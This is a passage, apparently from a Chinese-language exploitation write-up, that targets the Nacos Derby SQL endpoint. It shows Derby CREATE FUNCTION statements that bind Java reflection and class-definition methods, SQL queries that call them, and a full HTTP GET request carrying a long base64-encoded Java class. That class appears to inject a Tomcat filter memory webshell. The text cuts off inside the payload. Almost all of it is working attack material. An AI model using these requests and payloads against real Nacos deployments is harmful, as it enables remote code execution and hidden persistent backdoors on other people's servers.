create function n(s varchar(2000)) returns c external name 'java.lang.Class.forName' language java parameter style java
create function f(a varchar(32672), b varchar(32672) for bit data, x l, y p, z c) returns c external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String,byte[],java.lang.ClassLoader,java.security.ProtectionDomain,java.lang.Class)' language java parameter style java
------WebKitFormBoundarydGQWXb3jKyayCIGQ--
```

![](assets/004.png)


```sql
select count(*) as b,f('org.springframework.boot.loader.xxxx',d('MemShellParty生成的字节码'),g(),null,n('org.springframework.boot.loader.Launcher')) as a from config_info /*limit*/

select count(*) as b, n('org.springframework.boot.loader.xxxx') as a from config_info /*limit*/
```


```http
GET /nacos/v1/cs/ops/derby?sql=select+count%28%2A%29+as+b%2Cf%28%27org.springframework.boot.loader.TimeZoneSerializer9c2b6d1b8f654d5d83941e25cfc457d6%27%2Cd%28%27yv66vgAAADIBwwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvYm9vdC9sb2FkZXIvVGltZVpvbmVTZXJpYWxpemVyOWMyYjZkMWI4ZjY1NGQ1ZDgzOTQxZTI1Y2ZjNDU3ZDYHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQACb2sBAAFaAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQACLyoIAAsBAAxnZXRDbGFzc05hbWUBAC5vcmcuYXBhY2hlLmh0dHAud2ViLmhhbmRsZXJzLnNjc1pKLk9BdXRoRmlsdGVyCAAOAQAPZ2V0QmFzZTY0U3RyaW5nAQucSDRzSUFBQUFBQUFBQUtWWGVWeGJ4eEgrRmdsV0NCRmorVlI4dHFtTlFJRE1JWXpCU1EweXFYRTQzRUJOTWIwZVlrR3loYVM4OTJTZ2Qzb2t2ZS9MclhzM3BXMTZZTklLQ0lsRHI2Uk42cVpwMGp1OTR6YTk3L3lSWDMrbXMrODlDVW1JNUk5aW85WHN6T3grTS92TjdITC9sVHN2QW1qQUV3eDFjWFhjcnlTVVVGajR3N3FlOEUrS0VYOVlpWTFHaGFyNXRaQjI2cmkvcnoycGg2K1BSSFdoY2pDR0xhZVZzNG8vcXNURy9jR29vbW5kY1dWVXFtd01tNlZxeXE4SjlXeFU2UDYwVXpHRDdZeVlabkIzci9yMjYyb2tOdDdHVU5FWWFoWUhSbHFVUTZINlFFTkRrK0pBS1lNOVFVczdVRWF1RTZNQmhyMzE5Y0dqemUwdEJ3TXRoMXFhNnBzYm00T05COXVETFEzTjdRM3RCNW82Z2c1Y3hlQU1Dd21tVjVrUURDWHRvWkJJNkE1c1pDZ3pGU2VWYUpJMHBicjhPVkxmME9qQVpnYWVVS2FqRkFYRHh1Njg0QWpmNXZ5NXc5WFgwWFRKNFVnc29sOUgrTHhWSjEzdzRHb243TmpCY0xVMzM4SE1VSnRwdGt1YTdXWndqTWJOL0RBTW14NnJpZXMzeHh2RlRVbWg2VzNyYWJWRVBLYUpmTFc1YWpDc1JHSzBKY1B1Z3Q2ZFV6STNrWGlNNDVrTW13ekVrYmkvcXk5TDhheTB3Z2hsSUt6R0o1V1JxT0RZejdBdmQxV0RQTWZvSXhjNmg1ZGgvOU9abW5Gd1ZMdFFBVWNwaWxCRFp6UXU5R1BHb2RFSzNyWEVxVm83NVVJZC9HV293Z0VYTnBrTE5SQy84dTA0bWlqOW9YaE1weFJwRER0eURpeXNxUDBTZkN3azJxcE91ZENNZzA0RTBHSWlHbFFqeHBGdDgxcjdVODVPMEtLV2dpQzBvcTBNUGh4Mm9jeUVRQlJ4a2VjSlJTVldrbzBMUjB5VTdhUVlVVFRSM0hSVWhPS2p4TXV0aGVJYzduQWhpS05PV3FxVGdVMFJYNzNESGFlTStlZmdtSnp2Y21FcnRzbk5ic2lKbDQ2TU1zalJ3MUFlU3FxcWlPbm1GTEhhbTUxQWM1YlE5K0dFRTcxNExwVTVZUTVTanNTVW5rVmlCaytPWXphL1hlakhnUFIrbnNSRUZHZHlHY0s2eG9GTW40OGhhWFdLWWVkVGNaL2pCUXk3bnBML0hDOGlWT3ZXQU1kTHN2aWRkVlljSXd4Rnd4MGNvOVlXMHFCaldoZnRxcXBNOXlYMVJGS25ReERLQk1lWUUrT3l1RGZrUmNJUm9lWVNFNU5kTVUxWGlEUDVtZTBiT1MxQ09nVjhCbEVuVG1NaTU0Qk1MVWVjK2drRnJFUTFtYkcxN3BLSU4wRjFJZ0d5Y09oeGt4ejVtMlhxSUltejBuYlNoWEtUaE5SOFM3WGtpR2E1YmZWMmRSVjBmQmxlTHRuK0NvYmlTWm1sUERocFRsSW5leFZlN1VRSU4xUDRlanlUTldyY1hvT1pyOFhyWk1wZW4rRjRaeXpOOFZ4Q1pMYStGVytRakhpajNISTljRytXNE41QzRNYWlTUzNzd3R0azF3M2g3VFFUaXNZMTRjSTd6WmwzMFZFUmdUdFZOYTcyQ0UxVHhtbnJLbTkzZ1haV3VKTzhCKytWYU43SGNPVC82ODR5VjN2eGdUSW9PSmZUVDdNYTdZY3NVdFFsOVVpMHJzUElsd01mcGtvZmkxdVgyYjZuYVlIcHV2b29QaVpwOW5HNkMyWDhSdEpWQno1SmwrL3dHbk9PMjh5MjFpUDBjSHcwRTJ2T0xtdmRzdmRWeFZpVUdPbzNWeUFBTS9pTUJQQlppblY0TFpFNWJtZll2cDQ3eHhlb0VDS3hzL0V6RlBLaEFvVlFZTW1DMWZZbHpEcnhSVnlnWXBGOVRNSW1RR3RiRjVuZWdTL0xXdmtLdzFYQ1NOZUFWVjBPekJOZHRXU3NiaUtpaGVvNjJ2czcwelNtakM3S2tqVUVCNWJNYkp0dG5IUjNrMjVVbUxwNzFxNlJzZnNxVllkcDE1RWNHNU16WDZmc0ZPcVk1cHVqYkZTTVJXTENDbWNiR2VhV2NUcWtlM0dmZkdWOGl4NG43WjM5RHR4dkVXL0tIMUtuRTNyY0g0d2t3cklEZm9mV0pPQ3J6YXRxWFpybCtkSXUzOFdEVGx6Qzl4ajI1QmhvQ1JHaU1naXBRcjlCVFBlVHhQRjlGN2paaVI0eGowUjJETTJGSDhvMkVjQ1B6R2dLZHhvUGZ1TEV3L2dwOVJiNTVKS21YYWFsSnVoV2kralRmdHJITUgwVVA1ZVFma0dWSTU5WE1TVktKeUh6S1Z2U3IvQnJxZnhOL25XUTd2R1B5Y3N0YzZ0bjkzOEx4dStjdUl6ZlUyZEptRzVLNk15QXFzaTBiVi8xeTFyU2NQc0QvdWhFSmY0a3UrR2tYSUJhMDU3OGxtTGRWL0hZV0dUY2VMVHhVV290YXB6NmFUbk55dFBSMDIvWC9zaDRUTkdUS24yM0I0MldXbTVBNlZFU0E3S2ZFUmN6clVYRE15amxkbEFXNko5VG5nRjkvd2M5LzR0SWNzb25Ta1oya1Z5ZUpXOGd1U0pMZHBPOEtVdmVRaks5T2tqK3B5RnZKNW5KZHpCOS9vdG1OdExJYUN5dW5zZk9DNUEvVXIzTFVydkpwWWpHa21yZlBQYWs5WHNOd0tSblhRVGJTWE5QK0paUjFXcXZXWWF2dGRoam4wUHRJdXFMaU9JUHJncHphRXpoMERuYzVTbGV4TFVNclNWUzkreEZkQlJoQWRlMzhtb1B0NlZ3dkpYUG9mcys3RmhDMGRBQ2Jremg1RHdHUFR5RjRUdlFQWVBJRXNhSDVoRnVkWkJaQ3JIV1VrK3B4NUdDUGtpajNScTVPYVl3TmVncG1jTkxiUlVWS2J3eWhkZDRTcXFsOFMxa2VId0JiekptU0MvVmJ6V0VGTjRoUDk0OWcwMnQzTU1IcFFPZngvdEplV0VHRGdKZE1sanJxMW5FQjIyNFFGa0k0Q0U4UXRSeDRURThUaVBEdnlrZjllQXI5Smh3Y0JSeHZKRGp4UndLUnhXSGo0TUtUUUJQUXRDanBuTERrNEFjN2ZpUFRETXRlQTMyb1ZUZXMyYUtjUnZORnRPb3NXNzNSeGJ3aVo0YTk2ZllNajZkd3VkcWFQeDhDbk85dFNtazNBdjJ1M0Y2eU9ZVy9hU3FKU0V4Wkt1bTczUExDRkRlbW5yZGR4cnVNbWQybWFtVSs2NXNGNDg5ejhjM1M5RVU0VnA2Q3ArMzR0cU9vaFVTS1NoNjBRWEFPTTcvRndjNFhTVVN2cVR3ZVFKUEQyRUwvTzBXK09sVjhCY0xnbCsya0FUV2doZjBuL0FmN0hWL0xSLy9ON0s5OHZBYmJsWUlSd2hTVGdoQkdVSkFIb1FaUW1OdUNFeStmSzBRdHRDY0xJSFNhcC9OZDNFZTM1NDFxc0FzcDIrU0tUM3ZyV3E1bWFLMTAraHpQN0NBaDNwcmQ1NER0OC9BWHJ5RWg0Zm04SU1VZnV4K1lCNC9TK0dYdGI0VWZqdmJ5MmFONnF1RU40UHZNR3dyVk5aMmd6cUM0RjJTR0MrdFNIQlpjL1RsRWx1aHlyWlprMFlrQkluZVJCazROZ0lFTkxNZXEyWjZsM0I1cUhZZWovZjRLSTEvcHN6L2hZcjJYbkNTL3VxeHo3WVdaNFRpZTR6UzMwMS9Bb0YrZmNab0lxeUM3UXIyYzF6bW9EL1RBaXRrWm9Lb3BEa0pvL0lLa1lEYW1LeUdSL0UzSzVIbFJzWm9FYk9OcExOOURmMytQZE9QeW8xZE1rYjRIK1dWUW9nSUVRQUEIABEBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwAVAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAFwEAD3N1bi5taXNjLlVuc2FmZQgAGQEAD2phdmEvbGFuZy9DbGFzcwcAGwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAAdAB4KABwAHwEACXRoZVVuc2FmZQgAIQEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMACMAJAoAHAAlAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHACcBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAKQAqCgAoACsBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwALQAuCgAoAC8BAAlnZXRNb2R1bGUIADEBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAzADQKABwANQEAE1tMamF2YS9sYW5nL09iamVjdDsHADcBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHADkBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADsAPAoAOgA9AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAA%2FAEAKAAQAQQEAEW9iamVjdEZpZWxkT2Zmc2V0CABDAQAGbW9kdWxlCABFAQAOamF2YS9sYW5nL0xvbmcHAEcBAA9nZXRBbmRTZXRPYmplY3QIAEkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAEsATAkASABNDAATABQKAAQATwwABwAICQACAFEBAApnZXRDb250ZXh0AQARKClMamF2YS91dGlsL1NldDsMAFMAVAoAAgBVAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAFcKAFgATwwABQAGCQACAFoBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsMAFwAXQoAWABeAQAPY29udGV4dCBlcnJvcjogCABgAQAPZ2V0RXJyb3JNZXNzYWdlAQApKExqYXZhL2xhbmcvVGhyb3dhYmxlOylMamF2YS9sYW5nL1N0cmluZzsMAGIAYwoAAgBkAQAIdG9TdHJpbmcMAGYACgoAWABnAQANamF2YS91dGlsL1NldAcAaQEAB2lzRW1wdHkBAAMoKVoMAGsAbAsAagBtAQARY29udGV4dCBub3QgZm91bmQIAG8BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAHEAcgsAagBzAQASamF2YS91dGlsL0l0ZXJhdG9yBwB1AQAHaGFzTmV4dAwAdwBsCwB2AHgBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMAHoAewsAdgB8AQAKY29udGV4dDogWwgAfgEADmdldENvbnRleHRSb290AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsMAIAAgQoAAgCCAQACXSAIAIQBAAhnZXRTaGVsbAwAhgAuCgACAIcBAAZpbmplY3QBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAIkAigoAAgCLAQABWwgAjQwACQAKCgACAI8BAAhdIHJlYWR5CggAkQEAB2ZhaWxlZCAIAJMBAAEKCACVAQAQamF2YS9sYW5nL1N5c3RlbQcAlwEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwwAmQCaCQCYAJsBACUoKUxqYXZhL3V0aWwvU2V0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQARamF2YS91dGlsL0hhc2hTZXQHAJ4KAJ8ATwEAEGphdmEvbGFuZy9UaHJlYWQHAKEBABFnZXRBbGxTdGFja1RyYWNlcwEAESgpTGphdmEvdXRpbC9NYXA7DACjAKQKAKIApQEADWphdmEvdXRpbC9NYXAHAKcBAAZrZXlTZXQMAKkAVAsAqACqAQAHZ2V0TmFtZQwArAAKCgCiAK0BABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCACvAQAQamF2YS9sYW5nL1N0cmluZwcAsQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDACzALQKALIAtQEABnRhcmdldAgAtwEADWdldEZpZWxkVmFsdWUBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAuQC6CgACALsBAAZ0aGlzJDAIAL0BAAhjaGlsZHJlbggAvwEABnZhbHVlcwEAGCgpTGphdmEvdXRpbC9Db2xsZWN0aW9uOwwAwQDCCwCoAMMBABRqYXZhL3V0aWwvQ29sbGVjdGlvbgcAxQsAxgBzAQAGYWRkQWxsAQAZKExqYXZhL3V0aWwvQ29sbGVjdGlvbjspWgwAyADJCwBqAMoBAAZQb2xsZXIIAMwBAANhanAIAM4BAAdoYW5kbGVyCADQAQAFcHJvdG8IANIBAAdhZGFwdGVyCADUAQAJY29ubmVjdG9yCADWAQAHc2VydmljZQgA2AEABmVuZ2luZQgA2gEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMANwA3QoAogDeAQANZ2V0U2ltcGxlTmFtZQwA4AAKCgAcAOEBABMuK1dlYmFwcENsYXNzTG9hZGVyCADjAQAHbWF0Y2hlcwEAFShMamF2YS9sYW5nL1N0cmluZzspWgwA5QDmCgCyAOcBAAlyZXNvdXJjZXMIAOkKABwArQEABFJvb3QIAOwBAAhlbmRzV2l0aAwA7gDmCgCyAO8BAAdjb250ZXh0CADxAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDADzAPQLAGoA9QEAEWdldFNlcnZsZXRDb250ZXh0CAD3AQAMaW52b2tlTWV0aG9kAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAD5APoKAAIA%2BwEADmdldENvbnRleHRQYXRoCAD9CgCyAG0BAAMoLykIAQABAAEoCAECAQABKQgBBAEAFGdldFdlYkFwcENsYXNzTG9hZGVyAQArKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADmdldENsYXNzTG9hZGVyCAEIAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwEKAQAJZ2V0TG9hZGVyCAEMDAEGAQcKAAIBDgwADQAKCgACARABAAlsb2FkQ2xhc3MMARIAHgoBCwETDAAQAAoKAAIBFQEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMARcBGAoAAgEZAQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IMARsBHAoAAgEdAQALZGVmaW5lQ2xhc3MIAR8BAAJbQgcBIQEAEWphdmEvbGFuZy9JbnRlZ2VyBwEjCQEkAE0BABFnZXREZWNsYXJlZE1ldGhvZAwBJgA0CgAcAScKADoAKwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DAEqASsKASQBLAEAC25ld0luc3RhbmNlDAEuAHsKABwBLwEADWZpbmRGaWx0ZXJEZWYIATEMAQgA3QoAHAEzAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJEZWYIATUBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAgBNwEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlckRlZggBOQEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlck1hcAgBOwEADXNldEZpbHRlck5hbWUIAT0BAA5zZXRGaWx0ZXJDbGFzcwgBPwEADGFkZEZpbHRlckRlZggBQQEADWFkZFVSTFBhdHRlcm4IAUMBAA1zZXRVUkxQYXR0ZXJuCAFFAQAOZmluZEZpbHRlck1hcHMIAUcBABdqYXZhL2xhbmcvcmVmbGVjdC9BcnJheQcBSQEAJihMamF2YS9sYW5nL0NsYXNzO0kpTGphdmEvbGFuZy9PYmplY3Q7DAEuAUsKAUoBTAEACWFycmF5Y29weQEAKihMamF2YS9sYW5nL09iamVjdDtJTGphdmEvbGFuZy9PYmplY3Q7SUkpVgwBTgFPCgCYAVABAApmaWx0ZXJNYXBzCAFSAQANc2V0RmllbGRWYWx1ZQEAOShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgwBVAFVCgACAVYBAAVhcnJheQgBWAEAMG9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5BcHBsaWNhdGlvbkZpbHRlckNvbmZpZwgBWgEAF2dldERlY2xhcmVkQ29uc3RydWN0b3JzAQAiKClbTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwwBXAFdCgAcAV4BAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgcBYAoBYQArAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAEuAWMKAWEBZAEADWZpbHRlckNvbmZpZ3MIAWYBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBaAFpCwCoAWoBABBqYXZhLnV0aWwuQmFzZTY0CAFsAQAKZ2V0RGVjb2RlcggBbgEABmRlY29kZQgBcAEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAXIBAAxkZWNvZGVCdWZmZXIIAXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwF2AQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAXgKAXkATwEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwF7AQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBfQEABShbQilWDAATAX8KAX4BgAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAEwGCCgF8AYMBAARyZWFkAQAFKFtCKUkMAYUBhgoBfAGHAQAFd3JpdGUBAAcoW0JJSSlWDAGJAYoKAXkBiwEAC3RvQnl0ZUFycmF5AQAEKClbQgwBjQGOCgF5AY8BAAVjbG9zZQwBkQAUCgF8AZIKAXkBkgEAYChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczwqPjtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAZYBAA1nZXRTdXBlcmNsYXNzDAGYAEAKABwBmQEAEk1ldGhvZCBub3QgZm91bmQ6IAgBmwEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEwGdCgGXAZ4BABJbTGphdmEvbGFuZy9DbGFzczsHAaABAAhnZXRGaWVsZAEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcBpAEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwGmAQASIEZpZWxkIG5vdCBmb3VuZDogCAGoCgGlAZ4MAaIBowoAAgGrAQADc2V0DAGtAIoKACgBrgEAE2phdmEvaW8vUHJpbnRTdHJlYW0HAbABABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWDAATAbIKAbEBswEAD3ByaW50U3RhY2tUcmFjZQEAGChMamF2YS9pby9QcmludFN0cmVhbTspVgwBtQG2CgAWAbcKAXkAZwoBsQGSAQAIPGNsaW5pdD4BAAAIAbwKAAIATwEABENvZGUBAA1TdGFja01hcFRhYmxlAQAKRXhjZXB0aW9ucwEACVNpZ25hdHVyZQAhAAIABAAAAAIACgAFAAYAAAAKAAcACAAAABIAAQAJAAoAAQG%2FAAAADwABAAEAAAADEgywAAAAAAABAA0ACgABAb8AAAAPAAEAAQAAAAMSD7AAAAAAAAEAEAAKAAEBvwAAAA8AAQABAAAAAxISsAAAAAAAAQATABQAAQG%2FAAACIQAHAAgAAAGjEhq4ACBMKxIitgAmTSwEtgAsLAG2ADBOEhwSMgO9ABy2ADYSBAHAADi2AD46BC22AEISRAS9ABxZAxIoU7YANjoFGQUtBL0ABFkDEhwSRrYAJlO2AD7AAEg6Bi22AEISSga9ABxZAxIEU1kEsgBOU1kFEgRTtgA2OgcZBy0GvQAEWQMSAlNZBBkGU1kFGQRTtgA%2BV6cABEynAAMAKrcAULIAUpkABLEBTCq2AFZMpwAkTbsAWFm3AFmyAFu2AF8SYbYAXyostwBltgBftgBoswBbK8YADCu5AG4BAJkAHrsAWFm3AFmyAFu2AF8ScLYAX7YAaLMAW6cAnyu5AHQBAE0suQB5AQCZAI8suQB9AQBOuwBYWbcAWbIAW7YAXxJ%2FtgBfKi23AIO2AF8ShbYAX7YAaLMAWyottwCIOgQqLRkEtgCMuwBYWbcAWbIAW7YAXxKOtgBfKrYAkLYAXxKStgBftgBoswBbpwArOgS7AFhZtwBZsgBbtgBfEpS2AF8qGQS3AGW2AF8SlrYAX7YAaLMAW6f%2FbgSzAFKyAJyyAFtXV7EAAwCpAK4AsQAWAREBaAFrABYAAACUAJcAGAABAcAAAABUAAz3AJcHABj8AAAHAAQC%2FwALAAIHAAIHAAQAAP8ACQACBwACBwBqAAEHABYgDBr8AAYHAHb%2FAGkABAcAAgcAagcAdgcABAABBwAW%2FAAnBwAE%2BAACAAEAUwBUAAMBvwAAAhUAAgAMAAABgbsAn1m3AKBMuACmuQCrAQBNLLkAdAEATi25AHkBAJkBYS25AH0BAMAAojoEGQS2AK46BRkFErC2ALaZAFoZBBK4uAC8Er64ALwSwLgAvMAAqDoGGQa5AMQBALkAxwEAOgcZB7kAeQEAmQApGQe5AH0BADoIGQgSwLgAvMAAqDoJKxkJuQDEAQC5AMsCAFen%2F9OnAOsZBRLNtgC2mQCPGQUSz7YAtpoAhRkEEri4ALwSvrgAvBLRuAC8EtO4ALw6BhkGEtW4ALwS17gAvBLZuAC8Etu4ALw6BxkHEsC4ALzAAKg6CBkIuQDEAQC5AMcBADoJGQm5AHkBAJkAKRkJuQB9AQA6ChkKEsC4ALzAAKg6CysZC7kAxAEAuQDLAgBXp%2F%2FTpwBaOganAFUZBLYA38YATRkEtgDftgBCtgDiOgYZBhLktgDomQA2GQS2AN8S6rgAvDoHGQfGACUZB7YAQrYA6xLttgDwmQAVGQcS8rgAvDoIKxkIuQD2AgBXp%2F6cK7AAAQCoASIBJQAYAAEBwAAAAHoACv4AGAcAnwcAagcAdv8ASAAIBwACBwCfBwBqBwB2BwCiBwCyBwCoBwB2AAAv%2BQAC%2FwBdAAoHAAIHAJ8HAGoHAHYHAKIHALIHAAQHAAQHAKgHAHYAAC%2F%2FAAIABgcAAgcAnwcAagcAdgcAogcAsgABBwAYBPsAUfkAAgHBAAAABAABABgBwgAAAAIAnQACAIAAgQABAb8AAACZAAQABAAAAGIBTSsS%2BAEBuAD8Ev4BAbgA%2FMAAsk2nAAROK7YAQrYA604sxwAFLbAstgD%2FmQAYuwBYWbcAWS22AF8TAQG2AF%2B2AGiwuwBYWbcAWS22AF8TAQO2AF8stgBfEwEFtgBftgBosAABAAIAFQAYABgAAQHAAAAAHQAE%2FwAYAAMHAAIHAAQHALIAAQcAGAD8AA0HALIbAAIBBgEHAAIBvwAAAEUABAAEAAAAJSsTAQkBAbgA%2FMABC7BNKxMBDQEBuAD8Ti0TAQkBAbgA%2FMABC7AAAQAAAAwADQAYAAEBwAAAAAYAAU0HABgBwQAAAAQAAQAYAAIAhgAuAAIBvwAAAM0ABgAHAAAAmCortwEPTQFOLCq2ARG2ARROpwBbOgQqtgEWuAEauAEeOgUTAQsTASAGvQAcWQMTASJTWQSyASVTWQWyASVTtgEoOgYZBgS2ASkZBiwGvQAEWQMZBVNZBAO4AS1TWQUZBb64AS1TtgA%2BwAAcTrsAWFm3AFmyAFu2AF8SjrYAXyy2AEK2AOu2AF8ShbYAX7YAaLMAWy22ATCwAAEACAARABQAGAABAcAAAAAbAAL%2FABQABAcAAgcABAcBCwcAHAABBwAY%2BwBXAcEAAAAEAAEAGAABAIkAigACAb8AAAJpAAcADQAAAcwrEwEyBL0AHFkDErJTBL0ABFkDKrYBEVO4APzGAASxK7YAQrYBNDoGGQYTATa2ARS2ATBOGQYTATi2ARQ6BRkFtgEwOgSnACI6BxkGEwE6tgEUtgEwThkGEwE8tgEUOgUZBbYBMDoELRMBPgS9ABxZAxKyUwS9AARZAyq2ARFTuAD8Vy0TAUAEvQAcWQMSslMEvQAEWQMqtgERU7gA%2FFenACE6By0TAUAEvQAcWQMSHFMEvQAEWQMstgBCU7gA%2FFcrEwFCBL0AHFkDLbYAQlMEvQAEWQMtU7gA%2FFcZBBMBPgS9ABxZAxKyUwS9AARZAyq2ARFTuAD8VxkEEwFEBL0AHFkDErJTBL0ABFkDKrYAkFO4APxXpwAiOggZBBMBRgS9ABxZAxKyUwS9AARZAyq2AJBTuAD8VysTAUgBAbgA%2FMAAOMAAODoIGQUZCL4EYLgBTcAAOMAAODoJGQkDGQRTGQgDGQkEGQi%2BuAFRKxMBUxkJuAFXpwAUOgorEwFTuAC8EwFZGQm4AVcZBhMBW7YBFLYBXwMyOgoZCgS2AWIZCgW9AARZAytTWQQtU7YBZToLKxMBZ7gAvMAAqDoMGQwqtgERGQu5AWsDAFexAAQAKABFAEgAGACDAJ8AogAYAPgBFQEYABgBbAF1AXgAGAABAcAAAABrAAkf%2FwAoAAcHAAIHAAQHAAQAAAAHAQsAAQcAGP8AHgAHBwACBwAEBwAEBwAEBwAEBwAcBwELAAB6BwAYHfcAVwcAGB7%2FAEAACgcAAgcABAcABAcABAcABAcAHAcBCwAHADgHADgAAQcAGBABwQAAAAQAAQAYAAEAZgAKAAEBvwAAABAAAQABAAAABLIAW7AAAAAAAAkBFwEYAAIBvwAAAJEABgADAAAAbxMBbbgAIEwrEwFvA70AHLYANgEDvQAEtgA%2BTSy2AEITAXEEvQAcWQMSslO2ADYsBL0ABFkDKlO2AD7AASLAASKwTRMBc7gAIEwrEwF1BL0AHFkDErJTtgA2K7YBMAS9AARZAypTtgA%2BwAEiwAEisAABAAAAQABBABgAAQHAAAAACAAB9wBBBwAYAcEAAAAEAAEAGAAJARsBHAACAb8AAAC%2FAAUABwAAAFy7AXlZtwF6TAFNuwF8WbsBflkqtwGBtwGETREQALwITiwttgGIWTYEngAOKy0DFQS2AYyn%2F%2B0rtgGQOgUsxgAHLLYBkyu2AZQZBbA6BizGAAcstgGTK7YBlBkGvwACAAoAPABLAAAASwBNAEsAAAABAcAAAABBAAX%2BACAHAXkHAXwHASL8ABUB%2FAANBwEi%2FwAGAAMHASIHAXkHAXwAAQcAFv8ACQAHBwEiBwF5BwF8AAAABwAWAAABwQAAAAQAAQF3AAkA%2BQD6AAMBvwAAANsABAAHAAAAhirBAByZAAoqwAAcpwAHKrYAQjoEAToFGQTGADMZBccALizHABIZBCsDvQActgEoOgWnAAwZBCsstgEoOgWn%2F9o6BhkEtgGaOgSn%2F84ZBccAH7sBl1m7AFhZtwBZEwGctgBfK7YAX7YAaLcBn78ZBQS2ASkZBSrBAByZAAcBpwAEKi22AD6wAAEAIQA9AEABlwABAcAAAAA7AAoOQwcAHP0ABAcAHAcAOhwIQgcBlwsgUgcAOv8AAAAGBwAEBwCyBwGhBwA4BwAcBwA6AAIHADoHAAQBwQAAAAQAAQAYAcIAAAACAZUACQGiAaMAAgG%2FAAAAZwAEAAQAAABAKrYAQk0sEgSlABIsK7YAJrBOLLYBmk2n%2F%2B67AaVZuwBYWbcAWSq2AEK2AOu2AF8TAam2AF8rtgBftgBotwGqvwABAAsAEAARAaUAAQH